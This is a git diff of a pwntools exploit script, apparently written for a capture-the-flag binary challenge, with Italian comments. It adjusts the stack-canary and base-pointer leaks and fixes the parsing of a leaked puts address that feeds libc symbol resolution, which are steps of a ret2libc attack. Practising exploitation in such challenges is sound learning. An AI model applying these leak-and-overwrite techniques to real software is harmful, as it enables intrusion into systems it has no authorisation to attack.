@@ -38,7 +38,7 @@ p.recvuntil(b'> ')
 p.send(b'A' * offset)
 p.recvline()
 canary = p.recvn(7)
-# other memory leak, inutile
+# other memory leak, inutile     P.S. non è inutile
 old_bp = p.recvuntil(b'Nice', drop=True).ljust(8, b'\x00')
 
 # aggiungo 0 al canary
@@ -96,8 +96,11 @@ p.recvuntil(b'Goodbye!\n', drop=True)
 
 # che odio
 # tagliavo via un byte da sinistra
-# evidentemente carica in memoria a un offset allineato
+# carica in memoria con primo bit con ascii 32, lo strippavo via
+# spiegato meglio: l'indirizzo della puts finiva con 0x20(spazio ascii) e lo strippavo via
+# recieved = p.recvline().strip()   # NOOOO
 recieved = p.recvline().rstrip()
+print(int(recieved[0])) # !!!!! 32, veniva strippato via(e io strippavo)
 leak = u64(recieved.ljust(8, b"\x00"))
 
 libc_func_address = libc.symbols[reference_func]
